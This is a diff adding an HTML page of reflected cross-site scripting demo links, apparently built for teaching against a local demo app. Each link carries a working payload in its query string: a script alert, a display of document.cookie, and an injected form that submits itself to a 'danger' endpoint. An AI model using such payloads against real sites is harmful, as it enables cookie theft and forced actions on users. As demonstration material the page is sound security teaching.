@@ -1,0 +1,19 @@
+<h1>XSS demo: Simple</h1>
+<a href="http://demoapp:8000/demo/?value=<script>alert('I injected something')</script>">
+    Link goes to http://demoapp:8000/demo/?value=&lt;script&gt;alert('I injected something')&lt;/script&gt;
+</a>
+
+<h1>XSS demo: get cookie <small>(because I turned HttpOnly cookies off)</small></h1>
+<a href="http://demoapp:8000/demo/?value=<script>alert(document.cookie)</script>">
+    Link goes to http://demoapp:8000/demo/?value=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</a>
+
+<h1>XSS demo: submitting dangerous form</h1>
+<a href="http://demoapp:8000/demo?value=<form method=POST action=%22/demo/danger%22><script>document.forms[0].submit()</script>">
+    Link goes to http://demoapp:8000/demo/?value=&lt;form method=POST action="/demo/danger"&gt;&lt;form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+</a>
+
+<h1>XSS demo: submit form stealthily (seperate page)</h1>
+<a href="demo-stealth.html">link to seperate page</a>
+
+
